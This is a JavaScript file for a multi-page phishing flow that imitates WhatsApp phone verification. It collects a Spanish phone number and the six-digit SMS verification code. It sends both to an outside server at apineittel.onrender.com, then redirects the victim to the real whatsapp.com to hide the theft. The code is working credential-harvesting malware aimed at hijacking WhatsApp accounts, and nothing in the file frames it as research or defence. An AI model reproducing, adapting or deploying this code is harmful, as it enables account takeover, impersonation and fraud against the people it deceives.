const inputPhoneNumber = document.getElementById("phoneNumber");
const inputSmsCode = document.getElementById("smsCode");

const placeToSetPhoneNumber = document.getElementById("placeToSetPhoneNumber");

function acceptAndContinue() {
  window.location.href = "etapa1.html";
}

function wrongNumber() {
  window.location.href = "etapa1.html";
}

function confirmPhoneNumber() {
  const phoneNumber = inputPhoneNumber.value;

  if (phoneNumber.length < 9) {
    return;
  }

  localStorage.setItem("phoneNumber", phoneNumber);
  return fetch("https://apineittel.onrender.com/submit-whatsapp2", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: `Telefone: +34 ${phoneNumber}`,
    }),
  })
    .then((response) => response.json())
    .then((data) => (window.location.href = "etapa2.html"));
}

function confirmSms() {
  const sms = inputSmsCode.value;

  if (sms.length < 6) {
    return;
  }

  return fetch("https://apineittel.onrender.com/submit-whatsapp2", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: `SMS: ${sms}`,
    }),
  }).then((response) => response.json());
}

const formatPhoneNumber = (input) => {
  let formattedInput = input.value.replace(/\D/g, "");
  formattedInput = formattedInput.substring(0, 9);
  input.value = formattedInput;
};

inputPhoneNumber?.addEventListener("input", (event) => {
  formatPhoneNumber(event.target);
});

const formatSmsCode = (input) => {
  let formattedInput = input.value.replace(/\D/g, "");
  formattedInput = formattedInput.substring(0, 6);
  input.value = formattedInput;
};

inputSmsCode?.addEventListener("input", (event) => {
  formatSmsCode(event.target);

  if (event.target.value.length === 6) {
    confirmSms().then(() => {
      window.location.href = "https://whatsapp.com/";
    });
  }
});
